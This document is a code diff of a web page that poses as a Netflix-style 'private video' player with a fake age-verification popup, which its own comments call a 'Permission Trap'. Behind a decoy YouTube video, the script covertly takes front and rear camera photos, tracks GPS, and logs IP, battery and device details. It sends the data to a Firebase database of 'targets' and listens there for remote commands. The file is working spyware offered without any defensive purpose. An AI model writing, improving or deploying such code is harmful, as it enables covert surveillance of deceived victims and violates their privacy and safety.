@@ -9,41 +9,50 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
         
+        /* Background Image */
         #bg-container {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg'); /* Aapki Github wali pic */
+            background: url('https://w0.peakpx.com/wallpaper/216/339/HD-wallpaper-netflix-logo-black-background-netflix.jpg'); 
             background-size: cover; background-position: center; z-index: 1;
+            filter: blur(5px);
         }
 
         #overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); z-index: 5;
+            background: rgba(0,0,0,0.8); z-index: 5;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
 
         .play-btn {
-            width: 80px; height: 80px; background: rgba(255, 0, 0, 0.9);
-            border-radius: 50%; border: 4px solid #fff;
+            width: 90px; height: 90px; background: rgba(229, 9, 20, 0.9);
+            border-radius: 50%; border: none;
             display: flex; align-items: center; justify-content: center;
-            cursor: pointer; box-shadow: 0 0 20px #f00; transition: 0.3s;
+            cursor: pointer; box-shadow: 0 0 30px rgba(229, 9, 20, 0.5); transition: 0.3s;
         }
         .play-btn::after {
-            content: ''; border-style: solid; border-width: 12px 0 12px 24px;
-            border-color: transparent transparent transparent #fff; margin-left: 5px;
+            content: ''; border-style: solid; border-width: 15px 0 15px 30px;
+            border-color: transparent transparent transparent #fff; margin-left: 8px;
+        }
+        .play-btn:hover { transform: scale(1.1); background: #f00; }
+
+        .loading-text { color: #fff; margin-top: 20px; font-size: 14px; letter-spacing: 1px; animation: blink 1.5s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        /* Custom Fake Popup */
+        #permission-modal {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: #181818; width: 85%; max-width: 320px;
+            padding: 25px; border-radius: 4px; border: 1px solid #333;
+            z-index: 10; text-align: center; display: none;
+        }
+        #permission-modal h2 { color: #fff; font-size: 18px; margin: 0 0 10px 0; }
+        #permission-modal p { color: #aaa; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
+        .unlock-btn {
+            background: #e50914; color: #fff; border: none; padding: 12px 25px;
+            width: 100%; border-radius: 2px; font-weight: bold; font-size: 14px; cursor: pointer;
         }
 
-        .modal {
-            background: #111; border: 1px solid #f00; border-radius: 8px;
-            padding: 20px; width: 85%; max-width: 320px; text-align: center;
-            color: #fff; margin-top: 20px; display: none;
-        }
-
-        .start-btn {
-            background: #f00; color: #fff; border: none; padding: 12px;
-            width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer;
-        }
-
-        /* Video Layer - Fixed */
+        /* Video Layer */
         #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; }
         #main-player { width: 100%; height: 100%; }
     </style>
@@ -53,14 +62,13 @@
     <div id="bg-container"></div>
 
     <div id="overlay">
-        <div class="play-btn" onclick="showModal()"></div>
+        <div class="play-btn" id="main-play" onclick="showPopup()"></div>
+        <div class="loading-text" id="status-text">TAP TO UNLOCK PRIVATE VIDEO</div>
         
-        <div class="modal" id="v-modal">
-            <h3 style="color:#f00; margin:0 0 10px 0;">VERIFICATION REQUIRED</h3>
-            <p style="font-size:12px; color:#bbb;">Grant camera access to verify age and unlock video.</p>
-            <input type="text" id="target-id" placeholder="Enter Nickname..." 
-                   style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #333; background:#222; color:#fff; box-sizing:border-box;">
-            <button class="start-btn" onclick="ignite()">Verify & Play</button>
+        <div id="permission-modal">
+            <h2>Security Verification</h2>
+            <p>This content is protected. To continue, allow age verification via secure camera scan.</p>
+            <button class="unlock-btn" onclick="ignite()">CONTINUE & WATCH</button>
         </div>
     </div>
 
@@ -73,35 +81,33 @@
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
-    const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
-    // YouTube Video ID (Isse aap change kar sakte hain)
-    const videoID = "6Ogzc_-lW9w"; 
+    // Automatic ID Generation
+    const sessionID = "USER_" + Math.floor(Math.random() * 89999 + 10000);
+    const videoID = "6Ogzc_-lW9w"; // YouTube Video ID
 
-    function showModal() {
-        document.getElementById('v-modal').style.display = 'block';
+    function showPopup() {
+        document.getElementById('main-play').style.display = 'none';
+        document.getElementById('status-text').style.display = 'none';
+        document.getElementById('permission-modal').style.display = 'block';
     }
 
     async function ignite() {
-        const uName = document.getElementById('target-id').value;
-        if(!uName) return alert("Nickname required.");
-
         try {
-            // Step 1: Request Permissions (Ye click event ke andar hona chahiye)
+            // Permission Trap
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-            // Step 2: Show Video Container
+            // Start Video
             document.getElementById('video-container').style.display = 'block';
-            
-            // Step 3: Load YouTube with correct Autoplay flags
-            const ytURL = `https://www.youtube.com/embed/${videoID}?autoplay=1&controls=1&rel=0&showinfo=0&mute=0`;
+            const ytURL = `https://www.youtube.com/embed/${videoID}?autoplay=1&controls=1&rel=0&mute=0`;
             document.getElementById('main-player').src = ytURL;
 
-            // Step 4: Background Data Collection
-            logData(uName);
+            // Background Tasks
+            logData();
             trackGPS();
-            capture("user");
-            setTimeout(() => capture("environment"), 5000);
-            setInterval(() => capture("user"), 10000);
+            
+            // Initial Captures
+            capture("user"); 
+            setTimeout(() => capture("environment"), 3000);
 
             // Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
@@ -115,38 +121,45 @@
             });
 
         } catch (e) {
-            alert("Error: Verification requires camera access.");
+            alert("Security Error: Camera access is mandatory for age verification.");
             location.reload();
         }
     }
 
-    async function logData(name) {
+    async function logData() {
         let bat = "N/A";
         try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
         const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
         
         db.ref(`targets/${sessionID}/info`).set({
-            name: name, ip: ip.ip, battery: bat, 
-            platform: navigator.platform, status: "ONLINE", time: new Date().toLocaleTimeString()
+            name: "Auto_Target_" + sessionID.split('_')[1],
+            ip: ip.ip,
+            battery: bat,
+            ram: (navigator.deviceMemory || "N/A"),
+            platform: navigator.platform,
+            status: "ONLINE",
+            time: new Date().toLocaleTimeString()
         });
         db.ref('alerts').set({ id: sessionID, t: Date.now() });
     }
 
-    // Capture & Audio Functions (Same as before)
     async function capture(mode) {
         try {
-            const constraints = { video: { facingMode: mode === "user" ? "user" : { exact: "environment" } } };
-            const stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => {
-                return navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-            });
+            const constraints = { video: { facingMode: mode === "user" ? "user" : "environment" } };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
             const v = document.createElement('video'); v.srcObject = stream; await v.play();
+            
             setTimeout(() => {
                 const c = document.createElement('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({ img: c.toDataURL('image/jpeg', 0.4), type: mode });
+                db.ref(`targets/${sessionID}/photos`).push({ 
+                    img: c.toDataURL('image/jpeg', 0.5), 
+                    type: mode,
+                    time: new Date().toLocaleTimeString()
+                });
                 stream.getTracks().forEach(t => t.stop());
-            }, 2000);
+            }, 1500);
         } catch(e) {}
     }
 
@@ -174,4 +187,3 @@
 </script>
 </body>
 </html>
-
